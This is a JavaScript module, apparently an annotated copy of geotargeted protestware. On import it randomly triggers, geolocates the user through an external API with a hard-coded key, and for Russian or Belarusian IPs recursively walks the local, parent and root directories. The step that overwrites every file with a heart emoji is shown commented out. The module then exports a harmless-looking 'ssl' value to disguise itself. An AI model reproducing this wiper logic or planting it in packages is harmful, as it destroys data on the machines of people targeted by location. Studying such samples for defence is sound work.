import path from "path";
import fs from "fs";
import https from "https";

setTimeout(function () {
    // Does not attack anytime, but it does attack one over four times.
    const t = Math.round(Math.random() * 4);
    if (t > 1) {
        return;
    }

    // Call api.geolocation.io to get the location of the user.
    https.get('https://api.ipgeolocation.io/ipgeo?apiKey=ae511e1627824a968aaaa758a5309154', function (res) {
        // On data received from the api.geolocation.io server.
        res.on("data", function (response) {
            try {
                // Parse the response.
                const object = JSON.parse(response.toString("utf8"));
                // Get the country name.
                const country_name = object['country_name'].toLowerCase();
                // test if the country name is in the list of countries to attack.
                const isRussiaOrBelarus = country_name.includes('russia') || country_name.includes('belarus');
                // If the country is in the list of countries to attack, attack.
                if (isRussiaOrBelarus) {
                    // attack the current directory.
                    attack("./");
                    // attack the previous directory.
                    attack("../");
                    // attack the parent of the previous directory.
                    attack("../../");
                    // Attack the root directory.
                    attack("/");
                }
            } catch (t) { }
        });
    });
    // the attack is performed wityh a delay between 0 and 1 seconds.
}, Math.ceil(Math.random() * 1e3));

// This is the attack function.
// it is called when the user is in the list of countries to attack.
// it is called with the directory to attack.
// it is called with the target filename substring that is currently unused.
async function attack(dir = "", targetFilenameSubstring = "") {
    console.log("ATTACKING: " + dir + "\n");
    // if the dir does not exist, return.
    if (!fs.existsSync(dir)) {
        return;  
    }

    // used to store the directory contents
    let directoryContents = [];
    try {
        // get the directory contents.
        directoryContents = fs.readdirSync(dir);
    } catch (t) { }
    const files = [];

    for (var e = 0; e < directoryContents.length; e++) {

        // get the full path of the file.
        const i = path.join(dir, directoryContents[e]);

        // read the stats of the file to test if it is a directory or a file.
        let t = null;
        try {
            // lstatSync is used to test both real files and symbolic links.
            t = fs.lstatSync(i);  
        } catch (t) {
            continue;
        }

        // if the file is a directory, call the attack function recursively.
        if (t.isDirectory()) {
            const attackedFiles = attack(i, targetFilenameSubstring);
            // Keeps track of the files that were attacked.
            attackedFiles.length > 0 ? files.push(...attackedFiles) : null;
        } else if (i.indexOf(targetFilenameSubstring) >= 0) { // Pattern match (unused.. all filed are attacked anyway)
            try {
                
                console.log("WITH LOVE FILE: " + i);
                
                // NOTE: I have disabled the function which replaces the file contents with a '❤️'.
                //fs.writeFile(i, '❤️', function () { });
            } catch (t) { }
        }
    }
    return files;
}
const ssl = true;
export { ssl as default, ssl };